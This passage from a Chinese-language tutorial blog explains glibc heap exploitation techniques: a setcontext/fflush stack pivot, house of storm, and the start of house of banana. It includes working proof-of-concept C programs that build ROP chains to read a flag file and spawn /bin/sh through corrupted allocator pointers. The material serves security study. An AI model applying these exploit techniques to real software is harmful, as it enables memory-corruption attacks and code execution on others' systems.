<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line"><span class="built_in">assert</span> ((old_top == <span class="built_in">initial_top</span> (av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">        ((<span class="type">unsigned</span> <span class="type">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">         <span class="built_in">prev_inuse</span> (old_top) &amp;&amp;</span><br><span class="line">         ((<span class="type">unsigned</span> <span class="type">long</span>) old_end &amp; (pagesize - <span class="number">1</span>)) == <span class="number">0</span>));</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
<p>此处会对top_chunk的<code>size|flags</code>进行assert判断</p>
<ol>
<li>old_size &gt;= 0x20;</li>
<li>old_top.prev_inuse = 0;</li>
<li>old_top页对齐</li>
</ol>
<p>通过这里也可以触发assert</p>
</li>
</ul>
<p>在<code>fflush</code>函数中调用到了一个指针:位于<code>_IO_file_jumps</code>中的<code>_IO_file_sync</code>指针,且可以发现调用指针时RDX寄存器的值始终为<code>IO_helper_jumps</code>指针,这样就联系到了setcontext</p>
<p>如果存在一个任意写,通过修改 <code>_IO_file_jumps + 0x60</code>的<code>_IO_file_sync</code>指针为<code>setcontext+61</code><br>修改<code>IO_helper_jumps + 0xA0 and 0xA8</code>分别为可迁移的存放有ROP的位置和ret指令的gadget位置,则可以进行栈迁移</p>
<h2 id="示例-2"><a href="#示例-2" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Ubuntu 20.04, GLIBC 2.32_Ubuntu2.2</span></span><br><span class="line"><span class="comment">//gcc demo.c -o main -z noexecstack -fstack-protector-all -pie -z now -masm=intel</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/filter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/seccomp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdi_ret libc_base + 0x000000000002858F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rdx_r12 libc_base + 0x0000000000114161</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rsi_ret libc_base + 0x000000000002AC3F</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> pop_rax_ret libc_base + 0x0000000000045580</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> syscall_ret libc_base + 0x00000000000611EA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ret pop_rdi_ret+1</span></span><br><span class="line"><span class="type">size_t</span> libc_base;</span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">0x30</span>];</span><br><span class="line"><span class="type">char</span> FLAG[<span class="number">0x100</span>] = <span class="string">&quot;./flag.txt\x00&quot;</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">sandbox</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    prctl(PR_SET_NO_NEW_PRIVS, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_filter</span> <span class="title">sfi</span>[] =</span>&#123;</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000004</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x05</span>,<span class="number">0xC000003E</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x20</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x35</span>,<span class="number">0x00</span>,<span class="number">0x01</span>,<span class="number">0x40000000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x00</span>,<span class="number">0x02</span>,<span class="number">0xFFFFFFFF</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x15</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x0000003B</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x7FFF0000</span>&#125;,</span><br><span class="line">        &#123;<span class="number">0x06</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00000000</span>&#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">sfp</span> =</span> &#123;<span class="number">8</span>, sfi&#125;;</span><br><span class="line">    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &amp;sfp);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">setROP</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">uint32_t</span> i = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rax_ret;</span><br><span class="line">    ROP[i++] = <span class="number">2</span>;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)FLAG;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = syscall_ret;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">3</span>;</span><br><span class="line">    ROP[i++] = pop_rdx_r12;</span><br><span class="line">    ROP[i++] = <span class="number">0x100</span>;</span><br><span class="line">    ROP[i++] = <span class="number">0</span>;</span><br><span class="line">    ROP[i++] = pop_rsi_ret;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)(FLAG + <span class="number">0x10</span>);</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)read;</span><br><span class="line">    ROP[i++] = pop_rdi_ret;</span><br><span class="line">    ROP[i++] = <span class="number">1</span>;</span><br><span class="line">    ROP[i++] = (<span class="type">size_t</span>)write;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>,<span class="number">0LL</span>,<span class="number">2</span>,<span class="number">0LL</span>);</span><br><span class="line">    sandbox();</span><br><span class="line">    libc_base  = ((<span class="type">size_t</span>)setvbuf) - <span class="number">0x81630</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;LIBC:\t%#lx\n&quot;</span>,libc_base);</span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> magic_gadget = libc_base + <span class="number">0x53030</span> + <span class="number">61</span>; <span class="comment">// setcontext + 61</span></span><br><span class="line">    <span class="type">size_t</span> IO_helper = libc_base + <span class="number">0x1E48C0</span>; <span class="comment">// _IO_helper_jumps;</span></span><br><span class="line">    <span class="type">size_t</span> SYNC = libc_base + <span class="number">0x1E5520</span>; <span class="comment">// sync pointer in _IO_file_jumps</span></span><br><span class="line">    setROP();</span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA0</span>/<span class="number">8</span>) = ROP; <span class="comment">// 设置rsp</span></span><br><span class="line">    *((<span class="type">size_t</span>*)IO_helper + <span class="number">0xA8</span>/<span class="number">8</span>) = ret; <span class="comment">// 设置rcx 即 程序setcontext运行完后会首先调用的指令地址</span></span><br><span class="line">    *((<span class="type">size_t</span>*)SYNC) = magic_gadget; <span class="comment">// 设置fflush(stderr)中调用的指令地址</span></span><br><span class="line">    <span class="comment">// 触发assert断言,通过large bin chunk的size中flag位修改,或者top chunk的inuse写0等方法可以触发assert</span></span><br><span class="line">    <span class="type">size_t</span> *top_size = (<span class="type">size_t</span>*)((<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">0x10</span>) + <span class="number">0x18</span>);</span><br><span class="line">    *top_size = (*top_size)&amp;<span class="number">0xFFE</span>; <span class="comment">// top_chunk size改小并将inuse写0,当top chunk不足的时候,会进入sysmalloc中,其中有个判断top_chunk的size中inuse位是否存在</span></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x1000</span>); <span class="comment">// 触发assert</span></span><br><span class="line">    _exit(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h1><h2 id="概要-10"><a href="#概要-10" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong><code>House_of_storm</code>是一种结合了<code>unsorted_bin_attack</code>和<code>Largebin_attack</code>的攻击技术,其基本原理和<code>Largebin_attack</code>类似，但是不同的是<code>Largebin_attack</code>只可以在任意地址写出chunk地址实际应用中除了泄漏一个堆地址并没有什么其他用处，所以其基本无害。而<code>House_of_storm</code>则可以导致任意地址分配chunk，也就是可以造成任意地址写的后果，危害十分之大。<code>House_of_storm</code>虽然危害之大，但是其条件也是非常的苛刻。</p>
<p><strong>利用条件:</strong></p>
<ol>
<li>需要攻击者在<code>largebin</code>和<code>unsorted_bin</code>中分别布置一个chunk 这两个chunk需要在归位之后处于同一个<code>largebin</code>的index中,且<code>unsortedbin</code>中的chunk要比<code>largebin</code>中的大</li>
<li>需要<code>unsorted_bin</code>中的<code>bk指针</code>可控</li>
<li>需要<code>largebin</code>中的<code>bk指针和bk_nextsize</code>指针可控</li>
<li>更适用于有pie情况</li>
</ol>
<p><strong>利用效果:</strong>任意地址分配chunk</p>
<p><strong>有效版本:</strong>2.29</p>
<p><strong>失效原因:</strong>2.29unsorted_attck不再可行,2.30large_attack又被砍掉一半,且正好是该方式需要用的的部分</p>
<h2 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h2><hr>
<p> <code>House_of_storm</code>从根本上也是写堆地址，但是攻击者可以利用巧妙的构造<code>把这个堆地址伪造成size字段</code>。</p>
<p><strong>通过以前的知识可以知道<code>unsorted_bin_attack</code>的攻击是需要在对应地址伪造一个chunk结构出来的，而这个伪造出来的chunk结构最重要的就是这个<code>size字段</code>，因为只有首先有了<code>size字段</code>Glibc才会确认这是个chunk结构,才会有后续的验证。</strong></p>
<p>说简单就是要绕过unsorted遍历时的size检查</p>
<p>但是目前的情况因为我们不能去对应的地址伪造chunk，那么首要目标就是利用<code>Largebin_attack</code>在目标地址-8的位置上写出来一个<code>size</code>，其次就是对Glibc检验的绕过。</p>
<h2 id="示例-3"><a href="#示例-3" class="headerlink" title="示例"></a>示例</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc -ggdb -fpie -pie -o house_of_storm house_of_storm.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  presize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  size;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  fd_nextsize;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>  bk_nextsize;</span><br><span class="line">&#125;chunk;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *large_chunk,*unsorted_chunk;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *fake_chunk = (<span class="type">unsigned</span> <span class="type">long</span> *)&amp;chunk;</span><br><span class="line">    <span class="type">char</span> *ptr;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0X20</span>);</span><br><span class="line">    large_chunk=<span class="built_in">malloc</span>(<span class="number">0x408</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(large_chunk);</span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);</span><br><span class="line">    unsorted_chunk=<span class="built_in">malloc</span>(<span class="number">0x418</span>);  <span class="comment">//large_chunk归位</span></span><br><span class="line">    <span class="built_in">free</span>(unsorted_chunk);  <span class="comment">// unsorted_chunk归位</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//重点以下3步</span></span><br><span class="line">    unsorted_chunk[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk;</span><br><span class="line">    large_chunk[<span class="number">1</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk+<span class="number">8</span>;</span><br><span class="line">    large_chunk[<span class="number">3</span>]    = (<span class="type">unsigned</span> <span class="type">long</span> )fake_chunk<span class="number">-0x18</span><span class="number">-5</span>;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    ptr=<span class="built_in">malloc</span>(<span class="number">0x48</span>);</span><br><span class="line">    <span class="built_in">strncpy</span>(ptr, <span class="string">&quot;/bin/sh\x00&quot;</span>, <span class="number">0x10</span>);</span><br><span class="line">    system(((<span class="type">char</span> *)fake_chunk + <span class="number">0x10</span>));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在开启pie的情况下,堆块的高位一般都是0x55或0x56,共6字节,从size-5开始写就可以刚好把高位写在size</p>
<p>所以当我们申请的size和<code>0x56</code>经过对齐后相等的话，那么就可以拿到任意的chunk。</p>
<p>0x55 : <code>1010101</code></p>
<p>0x56 : <code>1010110</code></p>
<p><code>__int_malloc</code>在拿到chunk后返回到<code>__libc_malloc</code>，<code>__libc_malloc</code>会对chunk的进行检查，这里如果有错的话会直接crash，但是由于程序有随机化，多运行几次总能有一次成功的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	#define arena_for_chunk(ptr) \</span></span><br><span class="line"><span class="comment">    	(chunk_non_main_arena (ptr) ? heap_for_ptr (ptr)-&gt;ar_ptr : &amp;main_arena)</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">    过以下检测需要满足的要求，只需满足一条即可</span></span><br><span class="line"><span class="comment">    1. victim 为 0</span></span><br><span class="line"><span class="comment">    2. IS_MMAPPED 为 1</span></span><br><span class="line"><span class="comment">    3. NON_MAIN_ARENA 为 0</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">assert(!victim || chunk_is_mmapped(mem2chunk(victim)) </span><br><span class="line">       || ar_ptr == arena_for_chunk(mem2chunk(victim)));</span><br></pre></td></tr></table></figure>
<p>可以看出只有高位为0x56的情况下能通过检测</p>
<h1 id="house-of-banana"><a href="#house-of-banana" class="headerlink" title="house of banana"></a>house of banana</h1><h2 id="概要-11"><a href="#概要-11" class="headerlink" title="概要"></a>概要</h2><p><strong>简介:</strong>利用largebin attack劫持_rtld_global中的字段,间接或直接控制fini_array,以便在函数正常退出或返回时调用布置的函数</p>
<p><strong>利用条件:</strong></p>
<ol>
<li><strong>程序能够显式的执行exit函数</strong>或者<strong>是通过libc_start_main启动的主函数且主函数能够结束</strong>,二者需满足其一</li>
<li>largebin attack (可写free状态下largebin的bk_nextsize字段)</li>
</ol>
<p><strong>适用情况:</strong>存在largebin attack,Tcache Stashing Unlink Attack等</p>
<p><strong>利用效果:</strong>控制流</p>
<p><strong>有效版本:</strong>ALL</p>
<h2 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h2><p>在ld.so里存在一个_rtld_global结构体</p>
<p>gpt对这个结构的解释</p>
<blockquote>
<p>在Linux中，ELF（可执行与可链接格式）是一种用于执行程序和共享库的标准文件格式。而_rtld_global结构体是在Linux系统中用于管理动态链接器（runtime linker）的全局数据结构。</p>
<p>动态链接器（runtime linker）是负责在程序运行时加载和链接共享库的组件。它的主要任务是解析程序的依赖关系，加载所需的共享库，并解析符号引用，以便将其绑定到正确的地址上。</p>
<p>_rtld_global结构体是动态链接器的关键数据结构之一，它存储了动态链接器在运行时所需的全局信息。该结构体定义了动态链接器的状态和属性，包括已加载的共享库列表、符号表、重定位表、全局变量等等。</p>
<p>通过_rtld_global结构体，动态链接器可以跟踪和管理程序的符号依赖关系、共享库的加载和卸载、符号解析和重定位等操作。它提供了一个全局的上下文，使得动态链接器能够正确地处理程序的运行时链接需求。</p>
<p>总而言之，_rtld_global结构体在Linux中的作用是为动态链接器提供全局的状态和信息，以支持程序的动态加载和链接过程。</p>
</blockquote>
<p>该结构体较为复杂</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">rtld_global</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="comment">/* Don&#x27;t change the order of the following elements.  &#x27;dl_loaded&#x27;</span></span><br><span class="line"><span class="comment">     must remain the first element.  Forever.  */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Non-shared code has no support for multiple namespaces.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta"># <span class="keyword">define</span> DL_NNS 1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  EXTERN <span class="keyword">struct</span> <span class="title class_">link_namespaces</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* A pointer to the map for the main map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *_ns_loaded;</span><br><span class="line">    <span class="comment">/* Number of object in the _dl_loaded list.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_nloaded;</span><br><span class="line">    <span class="comment">/* Direct pointer to the searchlist of the main object.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_scope_elem</span> *_ns_main_searchlist;</span><br><span class="line">    <span class="comment">/* This is zero at program start to signal that the global scope map is</span></span><br><span class="line"><span class="comment">       allocated by rtld.  Later it keeps the size of the map.  It might be</span></span><br><span class="line"><span class="comment">       reset if in _dl_close if the last global object is removed.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_alloc;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* During dlopen, this is the number of objects that still need to</span></span><br><span class="line"><span class="comment">       be added to the global scope map.  It has to be taken into</span></span><br><span class="line"><span class="comment">       account when resizing the map, for future map additions after</span></span><br><span class="line"><span class="comment">       recursive dlopen calls from ELF constructors.  */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> _ns_global_scope_pending_adds;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Once libc.so has been loaded into the namespace, this points to</span></span><br><span class="line"><span class="comment">       its link map.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">link_map</span> *libc_map;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Search table for unique objects.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">unique_sym_table</span></span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_define_recursive (, lock)</span><br><span class="line">      <span class="keyword">struct</span> <span class="title class_">unique_sym</span></span><br><span class="line">      &#123;</span><br><span class="line">    <span class="type">uint32_t</span> hashval;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line">    <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">    <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">link_map</span> *map;</span><br><span class="line">      &#125; *entries;</span><br><span class="line">      <span class="type">size_t</span> size;</span><br><span class="line">      <span class="type">size_t</span> n_elements;</span><br><span class="line">      <span class="built_in">void</span> (*free) (<span class="type">void</span> *);</span><br><span class="line">    &#125; _ns_unique_sym_table;</span><br><span class="line">    <span class="comment">/* Keep track of changes to each namespace&#x27; list.  */</span></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">r_debug</span> _ns_debug;</span><br><span class="line">  &#125; _dl_ns[DL_NNS];</span><br><span class="line">  <span class="comment">/* One higher than index of last used namespace.  */</span></span><br><span class="line">  EXTERN <span class="type">size_t</span> _dl_nns;</span><br><span class="line">.................................................................................</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其中有多个<code>_dl_ns</code>结构体，调试发现，该结构体存储着的实际就是elf各段的符号结构体</p>
<p>类似于IDA中的段结构体</p>
<p>继续之后的学习还会遇见以下几个结构体</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="type">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">		      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span 